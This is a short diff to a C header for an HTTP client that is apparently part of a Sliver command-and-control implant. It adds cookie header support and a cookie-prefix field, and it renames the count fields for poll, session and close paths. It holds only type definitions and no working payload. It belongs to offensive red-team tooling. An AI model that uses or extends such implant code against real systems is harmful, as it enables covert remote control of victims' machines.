@@ -54,6 +54,7 @@ typedef enum _HttpHeader
 	Allow,
 	Authorization,
 	CacheControl,
+	Cookie,
 	Connection,
 	ContentEncoding,
 	ContentLanguage,
@@ -84,6 +85,7 @@ typedef enum _HttpHeader
 	Referer,
 	RetryAfter,
 	Server,
+	SetCookie,
 	Te,
 	Trailer,
 	TransferEncoding,
@@ -149,17 +151,17 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	DWORD dwPort;
 	BOOL UseStandardPort;
 	LPSTR PollPaths[66];
-	DWORD cbPollPaths;
+	DWORD cPollPaths;
 	LPSTR PollFiles[109];
-	DWORD cbPollFiles;
+	DWORD cPollFiles;
 	LPSTR SessionPaths[99];
-	DWORD cbSessionPaths;
+	DWORD cSessionPaths;
 	LPSTR SessionFiles[100];
-	DWORD cbSessionFiles;
+	DWORD cSessionFiles;
 	LPSTR ClosePaths[57];
-	DWORD cbClosePaths;
+	DWORD cClosePaths;
 	LPSTR CloseFiles[103];
-	DWORD cbCloseFiles;
+	DWORD cCloseFiles;
 	LPSTR lpPathPrefix;
 	DWORD dwMinNumOfSegments;
 	DWORD dwMaxNumOfSegments;
@@ -172,6 +174,7 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	DWORD dwMaxErrors;
 	LPSTR lpServerMinisignPublicKey;
 	BOOL IsClosed;
+	LPSTR lpCookiePrefix;
 } SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;
 
 typedef enum {
@@ -209,7 +212,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_ LPWSTR lpPath,
+	_In_ LPSTR lpPath,
 	_In_ DWORD dwNumberOfAttemps
 );
 
